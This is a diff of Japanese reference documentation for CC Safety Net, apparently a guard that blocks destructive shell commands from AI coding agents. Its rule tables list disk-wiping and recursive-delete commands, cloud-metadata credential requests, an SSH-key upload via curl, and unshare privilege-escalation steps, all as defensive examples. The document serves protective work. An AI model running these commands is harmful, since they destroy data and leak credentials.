@@ -32,7 +32,9 @@ keywords:
   - "policy.json 保護"
 ---
 
-CC Safety Net は、未コミットの変更、スタッシュに退避した作業、リモートの履歴、ディスクを完全に失わせるおそれのあるコマンドをブロックし、同じコマンドでも安全な書き方は許可します。以下の各表には、コマンド、[安全レベル](/ja/configuration/modes)ごとの結果、ルール ID を示します。ルール ID は、ブロックメッセージ、[監査ログ](/ja/reference/audit-log)、`explain --json` に表示されるものです。`cat .env` のようなファイルの読み取りは[シークレット保護](/ja/reference/secret-protection)の対象です。独自のブロックは[カスタムルール](/ja/configuration/custom-rules)で追加できます。
+CC Safety Net は、未コミットの変更、スタッシュに退避した作業、リモートの履歴、ディスクを完全に失わせるおそれのあるコマンドをブロックし、同じコマンドでも安全な書き方は許可します。各表には、コマンド、[安全レベル](/ja/configuration/modes)ごとの結果、ルール ID を示します。ルール ID は、ブロックメッセージ、[監査ログ](/ja/reference/audit-log)、`explain --json` に表示されるものです。
+
+`cat .env` のようなファイルの読み取りは[シークレット保護](/ja/reference/secret-protection)の対象です。独自のブロックは[カスタムルール](/ja/configuration/custom-rules)で追加できます。
 
 「結果」列の値の意味は次のとおりです。
 
@@ -78,7 +80,7 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
   </Step>
 </Steps>
 
-オーバーライドで無効になるのはルール全体であり、特定のコマンド 1 つではありません。逆に `"on"` を指定すると、安全レベルでは無効になっているルールを有効にできます。standard での `rm.recursive-force-paranoid` がその例です。登録されていない ID は `policy check` が拒否します。フィールドの書き方は[ポリシー](/ja/configuration/policy#destructive-command-protection)を参照してください。
+オーバーライドで無効になるのはルール全体であり、特定のコマンド 1 つではありません。逆に `"on"` を指定すると、安全レベルでは無効になっているルールを有効にできます。standard での `rm.recursive-force-paranoid` がその例です。フィールドの書き方は[ポリシー](/ja/configuration/policy#destructive-command-protection)を参照してください。
 
 ルールを無効にせず、特定のディレクトリ配下の再帰削除だけを許可するには、[`allow_paths`](#recursive-deletes-under-allow_paths) を使います。保護対象のファイルの読み取りを許可する方法は、[ブロックされたファイルを許可する](/ja/reference/secret-protection#allow-a-blocked-file)を参照してください。
 
@@ -96,15 +98,15 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 | [Strict](/ja/configuration/modes#strict-mode-cc_safety_net_strict=1) | さらに「Standard のみ」の行、解析できないすべてのコマンド、限られた対応形式から外れる [heredoc](#heredocs) もブロックする |
 | [Paranoid](/ja/configuration/modes#paranoid-mode-cc_safety_net_paranoid=1) | さらに、作業ディレクトリ内でも一時パス以外への再帰削除をブロックし、インタープリターのワンライナーを内容にかかわらずすべてブロックする |
 
-アナライザーの再帰の上限や構造の上限を超えるコマンドは、standard を含むすべてのレベルで拒否されます。
-
 <span id="catastrophic-rules"></span>
 
 ## 致命的なルール
 
-致命的なルールは 10 個あります。対象は、`/` またはホームディレクトリの再帰削除、Git メタデータの削除、そして CC Safety Net が対象を安全に読み取れない 2 種類の再帰削除です。以下の表では「致命的」と表示しています。
+致命的なルールは 10 個あります。対象は、`/` またはホームディレクトリの再帰削除、Git メタデータの削除、そして CC Safety Net が対象を安全に読み取れない 2 種類の再帰削除です。各表では「致命的」と表示しています。
 
-致命的なルールは `destructive_command_protection.enabled: false` も `"off"` のオーバーライドも無視するため、どのポリシーでも、すべての安全レベルでブロックします。緩和も一切適用されません。`allow_paths`、[ワークツリーモード](/ja/configuration/modes#worktree-mode-cc_safety_net_worktree=1)、一時リポジトリの緩和、「Standard のみ」の許可のいずれがあっても、ブロックは維持されます。本来そのコマンドを捕捉するルールが無効になっていても、致命的な対象はそれ自身のルールでブロックされます。そのため `parallel rm -rf ::: /` は、`rm.recursive-force-root-or-home` として引き続きブロックされます。
+致命的なルールは、どのポリシーでも、すべての安全レベルでブロックします。`destructive_command_protection.enabled: false`、`"off"` のオーバーライド、`allow_paths`、[ワークツリーモード](/ja/configuration/modes#worktree-mode-cc_safety_net_worktree=1)、一時リポジトリの緩和、「Standard のみ」の許可のいずれがあっても、ブロックは維持されます。
+
+本来そのコマンドを捕捉するルールが無効でもブロックするため、`parallel rm -rf ::: /` は `rm.recursive-force-root-or-home` として引き続きブロックされます。
 
 [Git メタデータ](#git-metadata)と [policy.json](#protected-policy-json-files) のガードも同じ扱いです。どちらも設定を読み込む前に実行されるため、どの設定でも無効にできません。
 
@@ -112,10 +114,8 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `git checkout -- <files>` | ブロック | `git.checkout-double-dash` |
-| `git checkout <path>`（`git checkout .` や `git checkout src/app.ts` など） | ブロック | `git.checkout-double-dash` |
-| `git checkout <branch>` | 許可 | |
-| `git checkout -b`、`-B`、`--orphan`、`-d` / `--detach`、`-t` / `--track` | 許可 | |
+| `git checkout -- <files>`、`git checkout .`、`git checkout src/app.ts` | ブロック | `git.checkout-double-dash` |
+| `git checkout <branch>`、`git checkout -b`、`-B`、`--orphan`、`-d` / `--detach`、`-t` / `--track` | 許可 | |
 | `git checkout --force` / `-f` | ブロック | `git.checkout-force` |
 | `git checkout <ref> -- <path>` | ブロック | `git.checkout-ref-path` |
 | `git checkout <ref> <path>` | ブロック | `git.checkout-ambiguous` |
@@ -149,22 +149,20 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 
 フラグなしの `git rm` は許可されます。`HEAD` から復元できない変更の削除は、Git 自身が拒否するためです。
 
-位置引数が 1 つだけの `git checkout <operand>` は、オペランドがパスの形（`.`、`./…`、`../…`、絶対パス、末尾のスラッシュ、glob）で書かれている場合か、実在するファイルやディレクトリを指している場合に、パスの復元として扱います。`main` のような素のブランチ名は許可されたままです。ブランチとファイルが同じ名前の場合はブロックされ、メッセージは `git switch` を案内します。`git switch` がパスを復元することはありません。
+位置引数が 1 つだけの `git checkout <operand>` は、オペランドがパスの形（`.`、`./…`、`../…`、絶対パス、末尾のスラッシュ、glob）をしている場合か、実在するファイルやディレクトリを指している場合に、パスの復元として扱います。`main` のようなブランチ名は許可されたままです。ブランチとファイルが同じ名前の場合はブロックされ、メッセージは `git switch` を案内します。
 
 [ワークツリーモード](/ja/configuration/modes#worktree-mode-cc_safety_net_worktree=1)を有効にすると、上の表のうちローカルの変更を破棄する行は、検証済みのリンクされたワークツリー内では許可されます。
 
 ### GIT_SSH_COMMAND はブロックされますか？
 
-コマンド自体が設定している場合だけブロックされます。`git.ssh-env` は、コマンドラインで `GIT_SSH_COMMAND`、`GIT_SSH`、`GIT_SSH_VARIANT` を設定するか、`git -c` や `GIT_CONFIG_*` で `core.sshCommand` を設定したうえで、Git のネットワークコマンド（`clone`、`fetch`、`pull`、`push`、`ls-remote`、`submodule`）を実行するものをブロックします。これらはいずれも、ネットワーク操作中に任意のプログラムを実行できるためです。
+コマンド自体が設定している場合だけブロックされます。これらの設定はいずれも任意のプログラムを実行できるためです。`git.ssh-env` は、コマンドラインで `GIT_SSH_COMMAND`、`GIT_SSH`、`GIT_SSH_VARIANT` を設定するか、`git -c` や `GIT_CONFIG_*` で `core.sshCommand` を設定したうえで、Git のネットワークコマンド（`clone`、`fetch`、`pull`、`push`、`ls-remote`、`submodule`）を実行するものをブロックします。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `GIT_SSH_COMMAND="ssh -i ~/.ssh/deploy" git clone <url>` | ブロック | `git.ssh-env` |
-| `GIT_SSH=./wrapper git fetch` | ブロック | `git.ssh-env` |
-| `git -c core.sshCommand=... push` | ブロック | `git.ssh-env` |
 | シェルのプロファイルで `GIT_SSH_COMMAND` を export した状態での `git push` | 許可 | |
 
-許可するには、エージェントを起動する前にシェルのプロファイルで変数を export するか、[ブロックされたコマンドを許可する](#allow-a-blocked-command)の手順で `"git.ssh-env": "off"` を指定してルールを無効にします。このルールは致命的なルールではありません。
+許可するには、エージェントを起動する前にシェルのプロファイルで変数を export するか、[ブロックされたコマンドを許可する](#allow-a-blocked-command)の手順で `"git.ssh-env": "off"` を指定してルールを無効にします。
 
 <span id="git-commands-in-a-temp-repository"></span>
 
@@ -172,13 +170,7 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 
 `/tmp` のような一時ディレクトリ配下の使い捨てリポジトリでは、変更を破棄する Git コマンドが許可されます。ただし、そのリポジトリがワークスペースそのものでも、ワークスペースの中でもない場合に限ります。たとえば `cd /tmp/scratch && git reset --hard` は実行できます。`git.push-*`、`git.ssh-env`、`git.alias-config` のルールはこの方法では緩和されず、[`allow_paths`](#recursive-deletes-under-allow_paths) でも範囲は広がりません。
 
-リポジトリの外にあるファイルを Git に扱わせるおそれがある場合、この緩和は適用されません。次の場合は通常のルールのままです。
-
-- コマンドが `git -c` または `GIT_CONFIG_*` で `core.worktree` を設定している場合や、リポジトリの設定に `worktree` キーがある場合
-- `.git` ディレクトリに `commondir` ファイルがある場合や、`objects` 以外の場所にシンボリックリンクまたは FIFO がある場合
-- `.git` ディレクトリの `objects` 以外のエントリが 10,000 を超える場合や、設定ファイルが 1 MiB を超えるか通常のファイルではない場合
-- `.git` ディレクトリが有効な Git ディレクトリではなく、Git が親のリポジトリを使ってしまう場合
-- Git を実行するディレクトリとリポジトリのルートの間にあるディレクトリに、`HEAD` または `.git` のエントリがある場合
+リポジトリの外にあるファイルを Git に扱わせるおそれがある場合は、通常のルールのままです。`core.worktree` の設定や、`.git` 内の `commondir` ファイルがその例です。
 
 <span id="filesystem-commands"></span>
 
@@ -196,9 +188,7 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 | `rm -rf "$target"` など、変数や置換から組み立てた対象 | Strict | `rm.recursive-force-dynamic-target` |
 | `rm -rf ./cache`（作業ディレクトリ内の一時パス以外） | Paranoid rm | `rm.recursive-force-paranoid` |
 | `rm -rf /tmp/...`、`rm -rf /var/tmp/...`、`rm -rf $TMPDIR/...` | 許可 | |
-| 設定済みの許可パス配下に対する `rm -rf <path>` | 許可 | |
 | `cleanup() { rm -rf ../outside; }; cleanup` | ブロック | `rm.recursive-force-outside-cwd` |
-| `cleanup() { rm -rf ../outside; }`（定義のみで呼び出さない） | 許可 | |
 | `f() { rm -rf "$1"; }; f ~` | Standard のみ | `rm.recursive-force-dynamic-target` |
 | `find . -delete`、または作業ディレクトリ外の一時パス以外を起点とする `find` | ブロック | `find.delete` |
 | `find ./cache -delete`（作業ディレクトリ内） | Paranoid rm | `find.delete` |
@@ -216,11 +206,7 @@ CC Safety Net は、未コミットの変更、スタッシュに退避した作
 | `parallel --dry-run` と、CC Safety Net が展開できない `parallel` の入力形式 | ブロック | `parallel.command-stream-dynamic` |
 | `awk '{ system($0) }'` | ブロック | `awk.system-dynamic` |
 
-CC Safety Net はシンボリックリンクを解決してからパスを比較します。そのため、`/` を指すシンボリックリンクは `/` として扱い、`/tmp-malicious` は一時パスとは見なしません。`-f` がなくても、見える範囲の対象は検査するため、`xargs rm -r ../other` は `rm.recursive-force-outside-cwd` としてブロックされます。シェル関数の本体は、関数を呼び出した位置で、呼び出し側の作業ディレクトリを基準に検査します。
-
-standard では、入力がコマンドの位置に来ることがなく、入力に `/` を代入しても無害なままの `xargs` のシェル本体は許可されます。`grep … | xargs` の行が通り、`rm -rf {}` の行が通らないのはこのためです。
-
-引用符のない glob は、対象を検査する前に展開します。作業ディレクトリがホームの場合、`rm -rf *` と `rm -rf ./*` は `rm.recursive-force-root-or-home` としてブロックされます。
+CC Safety Net はシンボリックリンクを解決してからパスを比較します。そのため、`/` を指すシンボリックリンクは `/` として扱い、`/tmp-malicious` は一時パスとは見なしません。引用符のない glob も先に展開するため、作業ディレクトリがホームの場合、`rm -rf *` は `rm.recursive-force-root-or-home` としてブロックされます。
 
 <Warning>
   standard は、動的な `rm -rf` の対象をブロックしません。`rm -rf "$target"` は standard では許可され、[strict](/ja/configuration/modes#strict-mode-cc_safety_net_strict=1) か [paranoid](/ja/configuration/modes#paranoid-mode-cc_safety_net_paranoid=1) でだけブロックされます。プロンプトインジェクションなど、信頼できない経路からコマンドが来る可能性がある場合は、どちらかのレベルを使ってください。
@@ -228,9 +214,9 @@ standard では、入力がコマンドの位置に来ることがなく、入�
 
 ### `rsync --delete` は検査されますか？
 
-検査されます。`--delete`、`--delete-after`、`--del` のような省略形など、rsync の削除オプションを付けると、CC Safety Net は最初のオペランドより後ろのオペランドをすべて宛先として検査します。一時ディレクトリ配下の宛先は許可されます。作業ディレクトリ内の宛先も、[paranoid の rm チェック](/ja/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1)を有効にしていなければ許可されます。変数から組み立てた宛先を含め、それ以外の宛先はすべてのレベルで `rsync.delete` としてブロックされます。`rsync -a --delete "$SRC/" "$DST/"` もこれに当たり、両方の変数が空なら `rsync -a --delete / /` として実行されます。
+検査されます。`--delete`、`--delete-after`、`--del` などの削除オプションを付けると、CC Safety Net は最初のオペランドより後ろのオペランドをすべて宛先として検査します。結果は[上の表](#filesystem-commands)のとおりです。
 
-ルートやホームを宛先にすると `rm.recursive-force-root-or-home`、`.git/` のような Git メタデータを宛先にすると `rm.git-metadata` でブロックされます。どちらも致命的です。`host:/srv/` のようなリモートの宛先は検査しません。また、`--remove-source-files` は削除として扱いません。
+変数から組み立てた宛先はブロックされます。両方の変数が空なら、`rsync -a --delete "$SRC/" "$DST/"` は `rsync -a --delete / /` として実行されるためです。`.git/` を宛先にすると致命的で、`rm.git-metadata` としてブロックされます。
 
 <span id="recursive-deletes-under-allow_paths"></span>
 
@@ -240,94 +226,94 @@ standard では、入力がコマンドの位置に来ることがなく、入�
 
 ## デバイスとディスクのコマンド
 
-CC Safety Net は、`dd`、`mkfs`、`mke2fs`、`newfs`、`shred`、`diskutil`、`wipefs`、`sgdisk`、`parted` と、ディスクへの出力リダイレクトを、すべての安全レベルで検査します。これらのルールはいずれも致命的なルールではありません。
+CC Safety Net は、`dd`、`mkfs`、`mke2fs`、`newfs`、`shred`、`diskutil`、`wipefs`、`sgdisk`、`parted` と、ディスクへの出力リダイレクトを、すべての安全レベルで検査します。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `dd if=/dev/zero of=/dev/sda`、`dd of=/dev/nvme0n1 if=/dev/zero` | ブロック | `dd.device-write` |
-| `dd if=/dev/sda of=./backup.img` | 許可 | |
-| `dd if=big.bin of=/dev/null bs=1M`、`of=/dev/zero`、`of=/dev/full` | 許可 | |
-| `dd ... of=/dev/nullx` など、それ以外の `/dev/` の対象 | ブロック | `dd.device-write` |
+| `dd if=/dev/zero of=/dev/sda`、および `/dev/null`、`/dev/zero`、`/dev/full` 以外の `/dev/` を対象とする `dd` | ブロック | `dd.device-write` |
+| `dd if=/dev/sda of=./backup.img`、`dd if=big.bin of=/dev/null bs=1M` | 許可 | |
 | `mkfs.ext4 /dev/sda1`、`mkfs -t ext4 /dev/sdb`、`mke2fs -t ext4 /dev/sde`、`newfs_hfs /dev/disk2s1` | ブロック | `mkfs.device` |
-| `mkfs.ext4 disk.img`、`mke2fs disk.img`、`newfs_hfs disk.img` | 許可 | |
 | `diskutil eraseDisk APFS Untitled disk4` と、サブコマンド `eraseVolume`、`reformat`、`partitionDisk`、`zeroDisk`、`randomDisk`、`secureErase` | ブロック | `disk.erase` |
-| `diskutil list`、`diskutil info disk4` | 許可 | |
-| `wipefs -a /dev/sdb`、`wipefs --offset=0x438 /dev/sdb` | ブロック | `disk.erase` |
-| `wipefs /dev/sdb`（シグネチャを表示するだけ） | 許可 | |
-| `sgdisk -Z /dev/sdc`、`sgdisk --zap-all /dev/sdd`、`sgdisk -n 1:0:0 /dev/sdd` | ブロック | `disk.erase` |
-| `sgdisk -p /dev/sda`、`sgdisk --print -v /dev/sda` | 許可 | |
-| `parted /dev/sde mklabel gpt`、`parted -s /dev/sdf rm 3`、および `mktable`、`mkpart`、`resizepart` | ブロック | `disk.erase` |
-| `parted /dev/sda print`、`parted -l` | 許可 | |
-| `wipefs -a disk.img`、`sgdisk -Z disk.img`、`parted disk.img mklabel gpt` | 許可 | |
+| `wipefs -a /dev/sdb`、`sgdisk -Z /dev/sdc`、`sgdisk -n 1:0:0 /dev/sdd`、`parted /dev/sde mklabel gpt`、および `parted` のサブコマンド `rm`、`mktable`、`mkpart`、`resizepart` | ブロック | `disk.erase` |
+| 読み取り専用の形：`diskutil list`、`wipefs /dev/sdb`、`sgdisk -p /dev/sda`、`parted /dev/sda print`、`parted -l` | 許可 | |
+| イメージファイル：`mkfs.ext4 disk.img`、`wipefs -a disk.img`、`sgdisk -Z disk.img`、`parted disk.img mklabel gpt` | 許可 | |
 | `echo x > /dev/sda`、`printf x >> /dev/disk4`、`echo x &> /dev/sdb` | ブロック | `redirect.block-device` |
 | `echo x > /dev/null`、`echo x > /dev/tty`、`cat < /dev/sda > disk.img` | 許可 | |
 | `shred -u secret.txt`、`shred --help`、`shred --version` | ブロック | `shred.target` |
 
-リダイレクトのルールが対象とするのは、`/dev/sda`、`/dev/disk4`、`/dev/nvme0n1`、`/dev/mapper/` 配下などのディスクデバイスです。それ以外の `/dev/` のパスは通常のリダイレクト先として扱います。これらのルールはラッパーの中にも適用されるため、`sudo mkfs.ext4 /dev/sda` も `bash -c "dd if=/dev/zero of=/dev/sda"` もブロックされます。検査対象外のディスクツールは[既知の制限](/ja/guides/known-limitations#disk-tool-coverage-is-a-named-list)にあります。
+リダイレクトのルールが対象とするのは、`/dev/sda`、`/dev/disk4`、`/dev/nvme0n1`、`/dev/mapper/` 配下などのディスクデバイスです。これらのルールはラッパーの中にも適用されるため、`sudo mkfs.ext4 /dev/sda` もブロックされます。検査対象外のディスクツールは[既知の制限](/ja/guides/known-limitations#disk-tool-coverage-is-a-named-list)にあります。
 
 <span id="network-commands"></span>
 
 ## ネットワークコマンド
 
-2 つのルールが、コマンドテキストから通信先を読み取ります。1 つは、インスタンスの資格情報を払い出すクラウドのメタデータエンドポイントを対象とします。もう 1 つは、ループバック以外のホストにデータを送る `curl` と `wget` のリクエストを対象とします。どちらもすべての安全レベルでブロックし、致命的なルールではないため、`"off"` のオーバーライドでそれぞれ無効にできます。CC Safety Net に[ネットワーク層がない](/ja/guides/known-limitations#no-network-layer)ことは変わらず、リクエスト自体は見ていません。
+2 つのルールが、コマンドテキストから通信先を読み取り、すべての安全レベルでブロックします。[クラウドのメタデータエンドポイント](#cloud-metadata-endpoints)と[リモートホストへのデータアップロード](#data-uploads-to-a-remote-host)です。CC Safety Net には[ネットワーク層がない](/ja/guides/known-limitations#no-network-layer)ため、リクエスト自体は見ていません。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` | ブロック | `network.cloud-metadata` |
 | `wget -qO- http://metadata.google.internal/computeMetadata/v1/` | ブロック | `network.cloud-metadata` |
 | `nc 169.254.169.254 80`、`socat - TCP:169.254.169.254:80` | ブロック | `network.cloud-metadata` |
-| `ruby -e "system(%q{curl http://100.100.100.200/})"` | ブロック | `network.cloud-metadata` |
 | `timeout 10 curl http://169.254.169.254/`、`xargs curl http://169.254.169.254/` | ブロック | `network.cloud-metadata` |
-| `grep -rn 169.254.169.254 /var/log`、`head -n1 169.254.169.254.txt` | 許可 | |
-| `dig metadata.google.internal`、`iptables -A OUTPUT -d 169.254.169.254 -j DROP` | 許可 | |
-| `curl --noproxy 'localhost,169.254.169.254' http://localhost:3000/x` | 許可 | |
-| `curl -T backup.tar https://uploads.example.com/` | ブロック | `network.upload-remote` |
-| `curl -d 'a=1' https://example.com/api`、`curl -F 'file=@report.pdf' https://example.com/u` | ブロック | `network.upload-remote` |
-| `wget --post-data 'a=1' https://example.com/api` | ブロック | `network.upload-remote` |
+| `grep -rn 169.254.169.254 /var/log`、`dig metadata.google.internal`、`iptables -A OUTPUT -d 169.254.169.254 -j DROP` | 許可 | |
+| `curl -T backup.tar https://uploads.example.com/`、`curl -F 'file=@report.pdf' https://example.com/u` | ブロック | `network.upload-remote` |
+| `curl -d 'a=1' https://example.com/api`、`wget --post-data 'a=1' https://example.com/api` | ブロック | `network.upload-remote` |
 | `curl -d x 'http://$HOST:3000/x'` | ブロック | `network.upload-remote` |
 | `curl -d 'a=1' http://localhost:3000/api`、`curl -d x "http://127.0.0.1:$PORT/x"` | 許可 | |
 | `curl -X PUT https://example.com/api`、`curl -G -d 'q=1' https://example.com/search` | 許可 | |
 | `curl --unix-socket /var/run/docker.sock -d '{}' http://localhost/containers/create` | 許可 | |
 
+<span id="cloud-metadata-endpoints"></span>
+
 ### クラウドのメタデータエンドポイント
 
-`network.cloud-metadata` は、次のホストのいずれかを指定したコマンドをブロックします。`169.254.169.254`、`169.254.170.2`、`169.254.170.23`、`fd00:ec2::254`、`fd00:ec2::23`、`metadata.google.internal`、`metadata.goog`、`100.100.100.200` です。照合では大文字と小文字を区別せず、ホスト全体が一致する必要があるため、`169.254.169.2540` と `metadata.google.internal.example.com` は許可されます。
+クラウドのメタデータエンドポイントは、インスタンスの資格情報を払い出します。`network.cloud-metadata` は、次のホストのいずれかを指定したコマンドをブロックします。`169.254.169.254`、`169.254.170.2`、`169.254.170.23`、`fd00:ec2::254`、`fd00:ec2::23`、`metadata.google.internal`、`metadata.goog`、`100.100.100.200` です。照合では大文字と小文字を区別せず、ホスト全体が一致する必要があるため、`169.254.169.2540` と `metadata.google.internal.example.com` は許可されます。
 
-ホストが意味を持つのは、そのコマンドが実際にリクエストを送れる場合だけです。CC Safety Net が検査するのは、HTTP クライアントの `curl`、`wget`、`aria2c`、`http`、`https`、`xh`、`xhs`、`httpie`、`fetch`、`lwp-request`、ソケットツールの `nc`、`ncat`、`netcat`、`socat`、`telnet`、インタープリターの `python`、`node`、`ruby`、`perl` です。それ以外のコマンドは無視するため、`dig`、ログファイルに対する `grep`、`iptables` のルール、アドレスを引用したコミットメッセージは、いずれも通ります。シェルも無視します。`bash -c` の中のコマンドは、CC Safety Net が個別に解析するためです。
+ホストが意味を持つのは、リクエストを送れる次のコマンドの場合だけです。`grep` や `dig` など、それ以外のコマンドは通ります。
 
-インタープリターのコード引数は 1 つのトークンなので、メタデータホストに対して `curl` を実行するワンライナーはブロックされます。ラッパーは先に外すため、`timeout 10 curl http://169.254.169.254/` はブロックされます。`xargs` と `find` では、起動するコマンドを解析するのではなく、引数リスト全体を一度にまとめて読み、ある語がリクエストを送るクライアントで、別の語がメタデータホストならブロックします。そのため `xargs curl <host>` はブロックされ、`xargs grep -l <host>` は許可されます。`--noproxy` の値は通信先として扱いません。
+| 種類 | コマンド |
+| --- | --- |
+| HTTP クライアント | `curl`、`wget`、`aria2c`、`http`、`https`、`xh`、`xhs`、`httpie`、`fetch`、`lwp-request` |
+| ソケットツール | `nc`、`ncat`、`netcat`、`socat`、`telnet` |
+| インタープリター | `python`、`node`、`ruby`、`perl` |
+
+<span id="data-uploads-to-a-remote-host"></span>
 
 ### リモートホストへのデータアップロード
 
-`network.upload-remote` は、本文やファイルを送る `curl` と `wget` のリクエストをブロックします。ただし、そのコマンドに含まれる URL がすべてループバックなら許可されます。データを送るオプションは、`curl` の `-d`、`--data`、`--data-ascii`、`--data-binary`、`--data-raw`、`--data-urlencode`、`--json`、`-F`、`--form`、`--form-string`、`-T`、`--upload-file` と、`wget` の `--post-data`、`--post-file`、`--body-data`、`--body-file` です。`-d@data.json` のように値を続けて書いた形も、`-sd x` のように短いオプションをまとめて書いた形も、どちらもデータオプションとして扱います。
+`network.upload-remote` は、本文やファイルを送る `curl` と `wget` のリクエストをブロックします。ただし、そのコマンドに含まれる URL がすべてループバックなら許可されます。データを送るオプションは次のとおりです。`-d@data.json` のように値を続けて書いた形や、`-sd x` のように短いオプションをまとめて書いた形も含みます。
 
-ループバックとして扱うホストは、`localhost`、`*.localhost` に一致する名前、`127.0.0.0/8`、`0.0.0.0`、`[::1]` です。CC Safety Net は各オペランドと、`--url`、`-x`、`--proxy`、`--preproxy` の値からホストを読み取り、ポートは無視します。そのため `curl -d x "http://localhost:$PORT/api"` は許可されます。`http://$HOST:3000/x` のように変数から組み立てたホストはループバックではないため、ブロックされます。`--proxy` の値が空の場合は通信先として扱いません。
+| ツール | オプション |
+| --- | --- |
+| `curl` | `-d`、`--data`、`--data-ascii`、`--data-binary`、`--data-raw`、`--data-urlencode`、`--json`、`-F`、`--form`、`--form-string`、`-T`、`--upload-file` |
+| `wget` | `--post-data`、`--post-file`、`--body-data`、`--body-file` |
 
-次の形は許可されます。データオプションを伴わない `-X PUT` だけのもの、データをクエリ文字列に変える `-G` や `--get`、Docker API を呼び出すときに使う `--unix-socket` や `--abstract-unix-socket` です。
+ループバックとして扱うホストは、`localhost`、`*.localhost` に一致する名前、`127.0.0.0/8`、`0.0.0.0`、`[::1]` で、ポートは問いません。変数から組み立てたホストはループバックとして扱いません。ホストは `--url`、`-x`、`--proxy`、`--preproxy` の値からも読み取ります。`-G` / `--get` や `--unix-socket` / `--abstract-unix-socket` を使うリクエストは許可されます。
 
-`curl` の `-K` と `--config`、`wget` の `-i` と `--input-file` は、URL をファイルから読み込みます。CC Safety Net はそのファイルを開かないため、これらを使うアップロードはブロックされます。認識できないオプションの値も URL として数えるため、パースを誤った場合は許可ではなくブロックになります。
+保護対象のファイルを指定したアップロードは、代わりにシークレットのルールでブロックされます。そのため `curl -T ~/.ssh/id_rsa https://example.com/` は `secret.home.ssh` としてブロックされます。[シークレット保護](/ja/reference/secret-protection)を参照してください。
 
-保護対象のファイルを指定したアップロードは、代わりにシークレットのルールで報告されます。そのため `curl -T ~/.ssh/id_rsa https://example.com/` は `secret.home.ssh` としてブロックされます。保護対象のファイルは[シークレット保護](/ja/reference/secret-protection)を参照してください。
+<Accordion title="URL をファイルから読み込むアップロード">
+  `curl` の `-K` と `--config`、`wget` の `-i` と `--input-file` は、URL をファイルから読み込みます。CC Safety Net はそのファイルを開かないため、これらを使うアップロードはブロックされます。認識できないオプションの値も URL として数えるため、パースを誤った場合は許可ではなくブロックになります。
+</Accordion>
 
 ## unshare とユーザー名前空間
 
-`unshare` でユーザー名前空間を作ると、その中ではプロセスが root になります。これは権限昇格に至るよくある手順です。`unshare.user-namespace` は、これをすべての安全レベルでブロックします。致命的なルールではないため、`"off"` のオーバーライドで無効にできます。
+`unshare` でユーザー名前空間を作ると、その中ではプロセスが root になります。これは権限昇格に至るよくある手順です。`unshare.user-namespace` は、これをすべての安全レベルでブロックします。
 
 | コマンド | 結果 | ルール ID |
 | --- | --- | --- |
 | `unshare -Urm --propagation private sh -c 'mount -t tmpfs none /mnt'` | ブロック | `unshare.user-namespace` |
 | `unshare -r id`、`unshare --owner 0:0 bash` | ブロック | `unshare.user-namespace` |
-| `unshare --whitelist-env FOO -U bash` | ブロック | `unshare.user-namespace` |
 | `timeout 5 unshare -r id`、`find . -exec unshare -r id \;` | ブロック | `unshare.user-namespace` |
 | `unshare -n sh -c 'rm -rf ~'` | 致命的 | `rm.recursive-force-root-or-home` |
 | `unshare -n true`、`unshare -n grep -r TODO src` | 許可 | |
 | `printf 'true\n' \| xargs -n1 unshare -r` | 許可 | |
 
-このルールは、プログラムより前にあるオプションを読み取ります。対象は `-U`、`--user`、`-r`、`--map-root-user`、`-c`、`--map-current-user`、`--map-auto`、`--map-user`、`--map-users`、`--map-group`、`--map-groups` で、`-Urm` のようにまとめて書いた短いオプションの中も対象です。さらに `--map-subids`、`--owner`、`--mount-binfmt`、`-l`、`--load-interp` も対象です。これらは util-linux では、ユーザー名前空間を明示しなくてもその作成を伴います。
+このルールが読み取るのは、プログラムより前にあるオプションだけです。プログラム自体は解析するため、`unshare -n sh -c 'rm -rf ~'` は `rm` のルールでブロックされます。
 
-CC Safety Net は `-R`、`-w`、`-S`、`-G`、`-l`、`--propagation`、`--setgroups`、`--root`、`--wd`、`--setuid`、`--setgid`、`--owner`、`--whitelist-env` の値を読み飛ばすため、値をプログラムと取り違えることはありません。プログラムより後ろのオプションはプログラムのものなので、`unshare -n grep -r TODO src` は許可されます。
-
-ユーザー名前空間を作らない `unshare` でも、そのプログラムは解析します。そのため `unshare -n sh -c 'rm -rf ~'` は `rm` のルールでブロックされます。`unshare` の前にある透過ラッパーは先に外すため、`timeout 5 unshare -r id` はブロックされます。`--use` のような getopt の省略形は一致せず、`xargs` が起動する `unshare` も一致しません。
+<Accordion title="対象となる unshare のオプション">
+  対象は `-U`、`--user`、`-r`、`--map-root-user`、`-c`、`--map-current-user`、`--map-auto`、`--map-user`、`--map-users`、`--map-group`、`--map-groups` で、`-Urm` のようにまとめて書いた短いオプションの中も対象です。さらに `--map-subids`、`--owner`、`--mount-binfmt`、`-l`、`--load-interp` も対象です。これらは util-linux では、ユーザー名前空間の作成を伴います。
+</Accordion>
 
 <span id="git-metadata"></span>
 
@@ -337,15 +323,13 @@ CC Safety Net は、リポジトリの `.git` エントリ、それが指す Git
 
 | コマンド | 結果 | ID |
 | --- | --- | --- |
-| `rm .git`、`rm -rf .git`、`rm -r .*` | 致命的 | `rm.git-metadata` |
-| リンクされたワークツリーやサブモジュールの `rm -rf <gitDir>` または `rm -rf <commonDir>` | 致命的 | `rm.git-metadata` |
+| `rm .git`、`rm -rf .git`、`rm -r .*`、およびリンクされたワークツリーやサブモジュールの Git ディレクトリに対する `rm -rf` | 致命的 | `rm.git-metadata` |
 | `mv .git backup` | ブロック | `guard.git-metadata` |
 | `.git/hooks/new-hook` を対象とする `Write` やパッチのツール呼び出し | ブロック | `guard.git-metadata` |
-| リポジトリルートでの `find . -exec rm {} +` | 致命的 | `find.delete-git-metadata` |
-| リポジトリルートでの `find . -name HEAD -exec rm {} +` | 致命的 | `find.delete-git-metadata` |
+| リポジトリルートでの `find . -exec rm {} +`、`find . -name HEAD -exec rm {} +` | 致命的 | `find.delete-git-metadata` |
